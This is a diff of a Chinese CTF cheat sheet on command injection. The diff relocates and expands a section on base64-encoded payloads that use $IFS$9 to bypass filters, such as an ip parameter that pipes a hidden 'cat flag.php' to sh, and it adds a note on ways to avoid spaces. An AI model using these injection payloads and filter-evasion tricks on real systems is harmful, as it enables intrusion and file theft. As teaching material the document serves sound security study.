@@ -119,25 +119,6 @@ ping -c 4 127.0.0.1&ls
 ping -c 4 127.0.0.1&cat 7672134566268.php| base64
 ```
 
-#### base 64 绕过复杂的正则表达式
-
-```bash
-http://xxx/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
-# $IFS$ 是空格绕过
-```
-
-解释："Y2F0IGZsYWcucGhw" 是 "cat flag.php" 的 Base64 编码。"cat flag.php" 是一个命令，它会显示 "flag.php" 文件的内容。
-
-所以，整个命令 `echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh` 的含义是：
-
-1. 使用 `echo` 命令输出 "Y2F0IGZsYWcucGhw" 这个 Base64 编码的字符串。
-
-2. 使用 `base64 -d` 命令解码这个字符串，得到 "cat flag.php"。
-
-3. 使用 `sh` 命令执行 "cat flag.php"，即显示 "flag.php" 文件的内容。
-
-这个命令的目的是以一种较隐蔽的方式显示 "flag.php" 文件的内容。
-
 ### nmap 注入
 
 ```bash
@@ -163,6 +144,26 @@ https://c.runoob.com/front-end/854/
 ```bash
 cat `find`
 ```
+
+#### base 64 绕过复杂的正则表达式
+
+```bash
+http://xxx/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
+# $IFS$9 是空格绕过
+# 意思是 cat flag.php
+```
+
+解释：$IFS$9 是空格绕过。"Y2F0IGZsYWcucGhw" 是 "cat flag.php" 的 Base64 编码。"cat flag.php" 是一个命令，它会显示 "flag.php" 文件的内容。
+
+所以，整个命令 `echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh` 的含义是：
+
+1. 使用 `echo` 命令输出 "Y2F0IGZsYWcucGhw" 这个 Base64 编码的字符串。
+
+2. 使用 `base64 -d` 命令解码这个字符串，得到 "cat flag.php"。
+
+3. 使用 `sh` 命令执行 "cat flag.php"，即显示 "flag.php" 文件的内容。
+
+这个命令的目的是以一种较隐蔽的方式显示 "flag.php" 文件的内容。
 
 ## 端口扫描
 
@@ -416,7 +417,7 @@ chr() 也是Python的内置函数，用于返回指定Unicode编码的字符。�
 
 #### PHP 绕过普通正则表达式的基本替代符
 
-- ${IFS} 和 %09 用于替换空格
+- ${IFS} 和 %09 用于替换空格。如果{}被过滤，还可以用 $IFS$9 来进行空格绕过，$9 会被识别为空字符
 
 - $@ 和 %27%27 替代空字符串
 
